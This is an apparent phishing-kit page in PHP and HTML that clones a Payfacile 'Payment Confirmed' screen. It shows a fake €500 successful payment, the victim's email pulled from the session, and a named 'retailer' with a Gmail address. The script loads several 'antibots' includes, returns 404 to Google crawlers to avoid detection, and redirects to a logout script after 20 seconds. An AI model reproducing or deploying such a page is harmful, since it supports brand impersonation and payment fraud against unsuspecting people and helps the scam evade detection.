<?php
error_reporting(0);
include "../bot/antibots1.php";
include "../bot/antibots2.php";
include "../bot/antibots3.php";
include "../bot/antibots4.php";
include "../bot/antibots5.php";
include "../bot/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------/
session_start();
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Refresh" content="20;url=../logout.php">
<style>.avatar { 
      height: 50px; 
      width: 50px; 
      position: relative; 
    } 
.avatar .avatar-image, 
.avatar .avatar-initials { 
      height: 100%; 
      width: 100%; 
      position: absolute; 
      top: 0px; 
      left: 0px; 
    } 
.avatar .avatar-image { 
      z-index: 10; 
      background-color: #fff; 
    } 
.avatar .avatar-initials { 
      display: block; 
      background-size: 100% 100%; 
      background-color: #aaa; 
      color: #fff; 
      font-size: 25px; 
      line-height: 50px; 
      font-family: "Helvetica Neue", Helvetica, "Hiragino Sans GB", Arial, sans-serif; 
      text-align: center; 
      z-index: 1; 
    } 
.avatar-rounded .avatar-image, 
.avatar-rounded .avatar-initials { 
      border-radius: 5px; 
    } 
.avatar-circle .avatar-image, 
.avatar-circle .avatar-initials { 
      border-radius: 50%; 
    } 
.avatar-hide-image .avatar-image { 
      display: none; 
    } 
.avatar-hide-initials .avatar-initials { 
      display: none; 
    } 
  .avatar-large {width: 80px; min-width: 80px; height: 80px;}
.avatar-large .avatar-initials {font-size: 40px; line-height: 80px;}
.avatar-small {width: 30px; min-width: 30px; height: 30px;}
.avatar-small .avatar-initials {font-size: 15px; line-height: 30px;}
.avatar-extra-small {width: 20px; min-width: 20px; height: 20px;}
.avatar-extra-small .avatar-initials {font-size: 10px; line-height: 20px;}
</style>
<style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><link href="https://client.relay.crisp.chat/" rel="dns-prefetch" crossorigin=""><link href="https://settings.crisp.chat/" rel="preconnect" crossorigin=""><link href="https://client.crisp.chat/" rel="preconnect" crossorigin=""><link href="https://image.crisp.chat/" rel="preconnect" crossorigin=""><script src="./Payment Confirmed_files/client.js.téléchargement" type="text/javascript" async=""></script><link href="./Payment Confirmed_files/client_default.css" type="text/css" rel="stylesheet"></head><body>


  <link rel="stylesheet" type="text/css" class="__meteor-css__" href="./Payment Confirmed_files/f202a3cd002b61da680b5a7f3e47105b0f0e0d87.css">
  <link rel="stylesheet" type="text/css" class="__meteor-css__" href="./Payment Confirmed_files/9bccd35f01574c43f78ebca0c10845e20afabf78.css">
  <link rel="stylesheet" type="text/css" class="__meteor-css__" href="./Payment Confirmed_files/b9acde512d5175436b5ff1a0cd2e0ff01316c4a5.css">
<meta name="fragment" content="!">

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <link href="./Payment Confirmed_files/icon" rel="stylesheet">

    <title>Payment Confirmed</title>
    <meta name="description" content="Accept one-time and recurring payments from anywhere.">
    

<div id="__blaze-root"><nav class="white">
        <div class="container">
            <div class="nav-wrapper">
                <div class="brand-logo after-purchase-vendor-logo" style="background-image: url(logo-payfacile-white-bg-200.png)">
                </div>
                
            </div>
        </div>
    </nav>
    <div id="afterPurchase">
        <div class="success-payment">
            <div class="showcase-main-container-background
 
" style="background-image:
                 
                     url(&#39;Payment Confirmed_files/5-Tourisme-Hébergement-Tourism.jpg&#39;)">
            </div>
            <section class="section success-wrapper">
                <div class="row center-align">
                    <div class="col s12 m8 offset-m2 l6 offset-l3 success-block">
                        <img class="center-custom" src="./Payment Confirmed_files/sucess.png">
                        <h4 class="font-border-custom border-purple">Payment successful</h4>
                        
                            <p>
                                Your payment of € 500.00 was successful and all the details have been sent to you on your registered email <strong><?php echo $_SESSION['email'];?></strong>
                            </p>
                        
                    </div>
                </div>
            </section>
        
            <section class="section download">
                <div class="row center-align">
                    <div class="col s12 m8 offset-m2 l6 offset-l3 success-summary">
                        <div class="card">
                            
                            <div class="card-content left-align">
                                <div class="row">
                                    <div class="col s12 center">
                                        <h5>1 versements</h5>
                                        <h4></h4>
                                    </div>
                                    <div class="col s6 offset-s3 center-align">
                                        
                                            <p class="price-custom">€ 500.00</p>
                                        
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <section class="section order-details">
            <div class="container">
                <div class="row">
                    <div class="col s10 offset-m1">
                        <h4>Order details</h4>
                    </div>
                    <div class="col s10 offset-s1 shadow-custom">
                        <div class="row details-row-custom">
                            <div class="col s12 m4 left-align">
                                <p><img src="./Payment Confirmed_files/box.png">Order number :</p>
                                <p class="grey-text light">163004</p>
                            </div>
                            <div class="col s12 m4 left-align">
                                <p><img src="./Payment Confirmed_files/calendar.png">Order date :</p>
                                <p class="grey-text light"><?php echo date('d/m/Y');?></p>
                            </div>
                            <div class="col s12 m4 left-align">
                                <p><img src="./Payment Confirmed_files/people.png">Retailer information :</p>
                                <p class="grey-text light">Ghislain Morissette / sylvainboucher67@gmail.com</p>
                            </div>
                        </div>
                    </div>
                    <div class="col s12 options-details-custom">
                            <li>
                                <div class="collapsible-header center-align">
                                    <h5 class="black-text">See more</h5>
                                    <a class="btn-floating btn-large waves-effect waves-light" data-action="test"><i class="material-icons">add</i></a></div>
                                <div class="collapsible-body">
                                    <table>
                                        <thead>
                                        <tr>
                                            <th>Description</th>
                                            <th>Quantity</th>
                                            <th class="unit-price">Unit price (excl. tax)</th>
                                            <th>VAT</th>
                                            <th>Total Price</th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                        
                                            <tr>
                                                <td>1 versements</td>
                                                <td>1</td>
                                                <td class="unit-price">€ 500.00</td>
                                                <td class="tva grey-text">0 €</td>
                                                <td>500 €</td>
                                            </tr>
                                            

                                            

                                            

                                            
                                        
                                        <tr class="total">
                                            <td>Total</td>
                                            <td></td>
                                            <td class="unit-price"></td>
                                            
                                                <td class="tva grey-text">€ 0.00</td>
                                                <td>€ 500.00</td>
                                            
                                        </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </li>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="after-purchase-footer">
            <div class="publicPageFooter">
        <div class="col s12 error-details">
            <section class="section subfooter-shadow">
                <div class="col s10 offset-s1 shadow-custom">
                    <div class="row center-align">
                        <div class="col s12 m12 l6 offset-l3">
                            <img class="center-custom" src="./Payment Confirmed_files/merchant.png">
                            <h4 class="font-border-custom border-purple">Need to accept online payments ?</h4>
                            <p class="notFound-footerSubtitle light">Payfacile is designed for businesses that need to accept one-off and recurring payments without a single line of code.</p>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <section class="font-border-custom error-footer">
            <div class="container">
                <div class="center-align">
                    <a href="https://en.payfacile.com/?utm_source=pf-footer"><img class="footer-logo" src="./Payment Confirmed_files/payfacile.png"></a>
                </div>
                <div class="row valign-wrapper public-footer-wrapper">
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-login"></i>
                        <a class="text-link" href="https://www.payfacile.com/sign-in">Login</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-information-outline"></i>
                        <a class="text-link" href="https://www.iubenda.com/privacy-policy/7969138" title="Privacy policy">Privacy policy</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-gavel"></i>
                        <a class="text-link" href="https://fr.payfacile.com/conditions-generales-de-vente/">Terms &amp; conditions</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-lock"></i>
                        <a class="text-link" href="https://en.payfacile.com/securite/">Security</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-account"></i>
                        <a class="text-link" href="https://www.payfacile.com/sign-up">Signup</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-checkbox-marked-outline"></i>
                        <a class="text-link" href="https://aide.payfacile.com/en/">FAQ</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-currency-eur"></i>
                        <a class="text-link" href="https://en.payfacile.com/pricing">Pricing</a>
                    </div>
                    <div class="col s5 offset-s1 m4 offset-m2 l2 offset-l1 footer-link-wrapper">
                        <i class="mdi mdi-message-video"></i>
                        <a class="text-link" href="https://fr.payfacile.com/introduction">Videos tutorials</a>
                    </div>
                </div>
            </div>
        </section>
    </div>
        </section>
    </div></div><div class="hiddendiv common"></div><div class="crisp-client"><div class="crisp-1o7uamv"><div class="crisp-1qz76wn"><style type="text/css">.crisp-client .crisp-1rjpbb7 .crisp-12w1xmh,
.crisp-client .crisp-1rjpbb7 .crisp-poqhnx:hover {
  color: #ffffff !important;
  -webkit-text-fill-color: #ffffff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-1wiroug,
.crisp-client .crisp-1rjpbb7 .crisp-ao27ue:hover {
  color: #3e3c66 !important;
  -webkit-text-fill-color: #3e3c66 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-6mlwlm,
.crisp-client .crisp-1rjpbb7 .crisp-q5z06s:hover {
  color: #6d69b2 !important;
  -webkit-text-fill-color: #6d69b2 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-wcida4,
.crisp-client .crisp-1rjpbb7 .crisp-o6w0yc:hover {
  color: #9C97FF !important;
  -webkit-text-fill-color: #9C97FF !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-pusm34 {
  background-color: #ffffff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-bdhv0t {
  background-color: #3e3c66 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-9o0cq7 {
  background-color: #8480d8 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-ws3gf1,
.crisp-client .crisp-1rjpbb7 .crisp-13h0akn:before,
.crisp-client .crisp-1rjpbb7 .crisp-13h0akn:after {
  background-color: #9C97FF !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-1gr5ak3 {
  background-color: #F5F5FB !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-145mbcr,
.crisp-client .crisp-1rjpbb7 .crisp-1jrqqbm:hover {
  background-color: #F9F9F9 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-17f70m7 {
  background-image: linear-gradient(125deg, #9C97FF -10%, #3e3c66 100%) !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-111u58f,
.crisp-client .crisp-1rjpbb7 .crisp-y1nqlk:hover {
  border-color: #ffffff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-14u434g {
  border-color: rgba(62, 60, 102, 0.175) !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-k6ym6q,
.crisp-client .crisp-1rjpbb7 .crisp-1hadq69:hover,
.crisp-client .crisp-1rjpbb7 .crisp-1kqjjm4:before,
.crisp-client .crisp-1rjpbb7 .crisp-1kqjjm4:after {
  border-color: #9C97FF !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-1n0zdj7 {
  border-color: rgba(156, 151, 255, 0.15) !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-rdu43e {
  border-top-color: #9C97FF !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-ogcg7k,
.crisp-client .crisp-1rjpbb7 .crisp-1mnx9b2:hover {
  border-color: #F5F5FB !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-11uxe11:placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-11uxe11:-moz-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-11uxe11::-moz-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-11uxe11:-ms-input-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-11uxe11::-webkit-input-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-14ixsrp:placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-14ixsrp:-moz-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-14ixsrp::-moz-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-14ixsrp:-ms-input-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-14ixsrp::-webkit-input-placeholder {
  color: #c3bcff !important;
  -webkit-text-fill-color: #c3bcff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-gjhthi,
.crisp-client .crisp-1rjpbb7 .crisp-1t1dtpc:hover,
.crisp-client .crisp-1rjpbb7 .crisp-gjhthi:hover,
.crisp-client .crisp-1rjpbb7 .crisp-1t1dtpc:active,
.crisp-client .crisp-1rjpbb7 .crisp-gjhthi:active,
.crisp-client .crisp-1rjpbb7 .crisp-1v3kwn:hover .crisp-oc2kqi,
.crisp-client .crisp-1rjpbb7 .crisp-1v3kwn .crisp-oc2kqi:active {
  background: #3e3c66 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-1dgibgx,
.crisp-client .crisp-1rjpbb7 .crisp-1r2x6vr:hover {
  background: #6d69b2 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-1dgibgx:hover,
.crisp-client .crisp-1rjpbb7 .crisp-1r2x6vr:active {
  background: #55538c !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-1dgibgx:active {
  background: #3e3c66 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-27o9vm:hover .crisp-1ekhg1c {
  background: #6d69b2 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-27o9vm .crisp-1ekhg1c:active {
  background: #55538c !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-ox3dbf,
.crisp-client .crisp-1rjpbb7 .crisp-1fmeyoi[data-active="true"] {
  background: #9C97FF !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-ox3dbf:hover {
  background: #8480d8 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-ox3dbf:active {
  background: #6d69b2 !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-k5ll1j::-moz-selection,
.crisp-client .crisp-1rjpbb7 .crisp-k5ll1j *::-moz-selection {
  background-color: #d2cbff !important;
}

.crisp-client .crisp-1rjpbb7 .crisp-k5ll1j::selection,
.crisp-client .crisp-1rjpbb7 .crisp-k5ll1j *::selection {
  background-color: #d2cbff !important;
}</style></div><div class="crisp-1nasccw"><style type="text/css">.crisp-client .crisp-1rjpbb7 {
  z-index: 1000000;
}
</style></div></div><div id="crisp-chatbox" lang="en" dir="ltr" translate="no" data-blocked="true" data-lock-maximized="false" data-last-operator-face="false" data-availability-tooltip="false" data-hide-vacation="false" data-hide-on-away="false" data-hide-on-mobile="false" data-position-reverse="false" data-full-view="false" data-small-view="false" data-large-view="false" data-availability="online" data-is-activity-ongoing="false" data-was-availability-online="true" data-has-local-messages="false" class="crisp-1rjpbb7"><div class="crisp-1rf4xdh crisp-k5ll1j"><a data-maximized="false" data-is-failure="false" href="https://www.payfacile.com/after_purchase?refo=738a8307-d5b7-4ae7-8c85-ca2f0517d2f2&amp;idsu=163004&amp;idc=228913#!" class="crisp-kquevr" data-cshid="e2add32c-eaa4-eabd-9f6f-c72eefa0bb34"><span class="crisp-1059tj2"><span data-id="general_entice" data-with-helpdesk="true" data-is-concealed="false" class="crisp-1xaupiq" style="display: block !important;"><span class="crisp-1sa0919"><span class="crisp-1s66m5e crisp-9dgo7z"><span class="crisp-yzclt"><span class="crisp-5me80a"><span class="crisp-bz13r8 crisp-i1yn7v"></span><span data-has-avatar="true" class="crisp-1sd4dmd"><span class="crisp-191rfs5"><span class="crisp-pkd0me crisp-13qutdl">Chat with support</span><span data-id="online" class="crisp-h99wdo crisp-9dgo7z">Support is online.</span><span data-id="away" class="crisp-h99wdo crisp-9dgo7z">Support is away.</span></span><span class="crisp-z83vpo"><span class="crisp-bjk43g crisp-4oo1n4"><span style="background-image: url(&#39;https://image.crisp.chat/process/thumbnail/?url=https%3A%2F%2Fstorage.crisp.chat%2Fusers%2Favatar%2Foperator%2F2be138064ca84000%2Fbfm_9asv5c.png&amp;width=240&amp;height=240&amp;1564904960903&#39;) !important;" class="crisp-2tz7y crisp-1mh9nm6"></span></span></span></span></span></span><span data-when="online" class="crisp-a1mko8"><span class="crisp-vz5ota crisp-1jrqqbm"><span class="crisp-4snher"><span class="crisp-rvg3pe crisp-wcida4 crisp-13qutdl">Chat with Payfacile Team</span></span></span></span><span data-when="away" class="crisp-a1mko8"><span data-pop="spotlight" class="crisp-vz5ota crisp-1jrqqbm"><span class="crisp-4snher"><span class="crisp-rvg3pe crisp-wcida4 crisp-13qutdl">Search help center</span></span></span><span class="crisp-vz5ota crisp-1jrqqbm"><span class="crisp-4snher"><span class="crisp-rvg3pe crisp-13qutdl">Chat</span></span></span></span></span></span></span></span><span class="crisp-x94m06 crisp-ws3gf1"><span data-id="chat_closed" class="crisp-16qgsyi"><span class="crisp-1t2kwsy"><span class="crisp-174tqf9 crisp-1e8tjtx"></span></span><span data-is-ongoing="false" class="crisp-101bp3x"></span></span></span></a></div></div></div></body></html>